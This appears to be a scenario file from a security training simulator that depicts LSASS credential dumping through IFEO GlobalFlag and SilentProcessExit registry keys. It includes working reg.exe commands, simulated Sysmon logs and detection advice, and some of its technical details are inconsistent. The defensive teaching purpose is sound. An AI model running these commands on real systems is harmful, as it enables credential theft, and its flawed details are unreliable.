import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'dfir-wer-silentprocessexit-localdumps-registry-hijack',
    title: 'Microsoft WER, Mandiant & Elastic DFIR — IFEO SilentProcessExit & WerFault.exe LSASS Dump Hijack (Sysmon EID 12 / 13)',
    category: 'MALWARE',
    mitreId: 'T1546.012',
    description:
      'Grounded in Microsoft Windows Error Reporting (WER) & Image File Execution Options (IFEO) documentation, Mandiant persistence & credential access research, and MITRE ATT&CK T1546.012 / T1003.001: an attacker sets the GlobalFlag (FLG_MONITOR_SILENT_PROCESS_EXIT = 0x200) under IFEO\\lsass.exe and configures HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe with ReportingMode=2 (LOCAL_DUMP) and MonitorProcess, tricking the trusted Windows Error Reporting binary (WerFault.exe) into dumping lsass.exe memory and launching an arbitrary SYSTEM command.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker Registry Modification', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'IFEO GlobalFlag (0x200)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'SilentProcessExit\\lsass.exe', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Sysmon EID 12/13 & Application', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'WerFault.exe (Trusted Dumper)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Enabling IFEO FLG_MONITOR_SILENT_PROCESS_EXIT (0x200) on lsass.exe (Sysmon EventID 13)',
        narration:
          'To avoid opening a direct suspicious handle to lsass.exe from an untrusted binary, the attacker configures HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe\\GlobalFlag = 0x00000200 (FLG_MONITOR_SILENT_PROCESS_EXIT). Sysmon EventID 13 logs the exact DWORD modification.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Persistence (T1546.012 - Event Triggered Execution: Image File Execution Options Injection)',
        technicalCommands: [
          'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe" /v GlobalFlag /t REG_DWORD /d 512 /f',
          'Flag Constant: FLG_MONITOR_SILENT_PROCESS_EXIT = 0x200 (512 decimal)',
        ],
        defenseMitigation:
          'Monitor Sysmon EventID 12 and 13 for any key creation or GlobalFlag / Debugger value modification under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\*.',
        logs: [
          {
            id: 'dfir-wer-1',
            timestamp: '03:10:04.112',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 13,
            ProcessName: 'reg.exe',
            CommandLine: 'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe" /v GlobalFlag /t REG_DWORD /d 512 /f',
            raw: 'EventID: 13 | EventType: SetValue | Image: C:\\Windows\\System32\\reg.exe | TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe\\GlobalFlag | Details: DWORD (0x00000200)',
            parsedFields: {
              EventID: '13 (Sysmon Registry Value Set)',
              TargetObject: 'HKLM\\...\\Image File Execution Options\\lsass.exe\\GlobalFlag',
              FlagValue: '0x00000200 (FLG_MONITOR_SILENT_PROCESS_EXIT)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Configuring SilentProcessExit\\lsass.exe LocalDumpFolder, DumpType=2 & MonitorProcess (Sysmon EventID 13)',
        narration:
          'Next, the attacker creates HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe and sets ReportingMode=2 (LAUNCH_NOTIFYPROCESS | LOCAL_DUMP), LocalDumpFolder="C:\\Windows\\Temp\\Dumps", DumpType=2 (Full Memory Minidump), and MonitorProcess="C:\\ProgramData\\beacon.exe".',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Credential Access (T1003.001 - SilentProcessExit LocalDumpFolder & MonitorProcess)',
        technicalCommands: [
          'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" /v ReportingMode /t REG_DWORD /d 2 /f',
          'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" /v LocalDumpFolder /t REG_SZ /d "C:\\Windows\\Temp\\Dumps" /f',
          'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" /v DumpType /t REG_DWORD /d 2 /f',
        ],
        defenseMitigation:
          'Alert on any registry write under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\* or HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\LocalDumps\\*.',
        logs: [
          {
            id: 'dfir-wer-2',
            timestamp: '03:10:06.450',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 13,
            ProcessName: 'reg.exe',
            CommandLine: 'reg.exe add "...\\SilentProcessExit\\lsass.exe" /v LocalDumpFolder /d C:\\Windows\\Temp\\Dumps',
            raw: 'EventID: 13 | EventType: SetValue | TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe\\LocalDumpFolder | Details: C:\\Windows\\Temp\\Dumps | DumpType: DWORD (0x00000002 Full Dump) | MonitorProcess: C:\\ProgramData\\beacon.exe',
            parsedFields: {
              EventID: '13 (Sysmon Registry Value Set)',
              RegistryKey: 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe',
              LocalDumpFolder: 'C:\\Windows\\Temp\\Dumps',
              DumpType: '0x2 (MiniDumpWithFullMemory)',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Triggering RtlReportSilentProcessExit & WerFault.exe Full LSASS Dump (Application EventID 3001)',
        narration:
          'The attacker calls ntdll.dll!RtlReportSilentProcessExit(hLsass, 0) (which only requires PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ or is triggered via CreateRemoteThread/NtTerminateProcess on a helper). The Windows Error Reporting service spawns the Microsoft-signed C:\\Windows\\System32\\WerFault.exe, which dumps lsass.exe-(PID).dmp into C:\\Windows\\Temp\\Dumps, spawns MonitorProcess, and logs Application EventID 3001 (Source: Winlogon / SilentProcessExit).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1003.001 - Trusted WerFault.exe Proxy Dumping LSASS)',
        technicalCommands: [
          'ntdll!RtlReportSilentProcessExit(hProcess, 0) -> LPC message to WerSvcGroup',
          'Sysmon EventID 10: SourceImage=C:\\Windows\\System32\\WerFault.exe TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1FFFFF',
          'Sysmon EventID 11: Image=C:\\Windows\\System32\\WerFault.exe TargetFilename=C:\\Windows\\Temp\\Dumps\\lsass.exe-(684).dmp',
        ],
        defenseMitigation:
          'Do not blindly exclude WerFault.exe or wermgr.exe from Sysmon EventID 10 (TargetImage=lsass.exe) or EventID 11 (*.dmp creation); correlate WerFault.exe LSASS access against SilentProcessExit registry keys.',
        logs: [
          {
            id: 'dfir-wer-3',
            timestamp: '03:10:09.812',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 10,
            ProcessName: 'WerFault.exe',
            CommandLine: 'C:\\Windows\\System32\\WerFault.exe -u -p 684 -s 1420 (Dumping lsass.exe via SilentProcessExit)',
            raw: 'EventID: 10 | SourceImage: C:\\Windows\\System32\\WerFault.exe | TargetImage: C:\\Windows\\System32\\lsass.exe | GrantedAccess: 0x1fffff | Correlated EventID 11: TargetFilename=C:\\Windows\\Temp\\Dumps\\lsass.exe-684.dmp | Application EventID 3001: Silent Process Exit monitored for lsass.exe',
            parsedFields: {
              EventID: '10 (ProcessAccess) + 11 (FileCreate) + 3001 (Application Log)',
              ProxyBinary: 'C:\\Windows\\System32\\WerFault.exe (Microsoft Signed)',
              TargetProcess: 'C:\\Windows\\System32\\lsass.exe',
              CreatedDumpFile: 'C:\\Windows\\Temp\\Dumps\\lsass.exe-684.dmp',
            },
          },
        ],
      },
    ],
  };
